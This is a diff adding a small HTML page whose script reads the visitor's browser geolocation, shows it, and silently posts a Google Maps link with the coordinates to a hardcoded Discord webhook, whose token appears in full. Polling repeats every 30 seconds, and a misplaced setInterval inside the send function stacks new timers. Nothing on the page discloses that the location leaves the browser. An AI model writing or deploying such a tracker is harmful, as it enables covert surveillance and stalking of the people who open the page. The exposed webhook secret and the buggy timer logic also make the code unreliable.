@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+var previousLocation;
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  x.innerHTML = "Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude;
+
+  if(!previousLocation || previousLocation.latitude !== position.coords.latitude || previousLocation.longitude !== position.coords.longitude) {
+    previousLocation = {latitude: position.coords.latitude, longitude: position.coords.longitude};
+    sendToDiscord(position);
+  }
+}
+
+function sendToDiscord(position) {
+  console.log(`Latitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`)
+  // Prepare the data to be sent
+  const data = {
+    content: `https://www.google.com/maps/search/${position.coords.latitude},${position.coords.longitude}`
+  };
+
+  // Send the data to the Discord webhook
+  fetch("https://discord.com/api/webhooks/1064331397696851988/qKiAIvJat36F7aQ_-XjReKZE4d3Ebn9_lrr84RR2MxR5tu2cMVbFAN0gDfYsOPBUnyOJ", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+});
+setInterval(getLocation, 30000); // call the getLocation function every 30s
+
+}
+
+getLocation();
+</script>
+
+</body>
+</html>
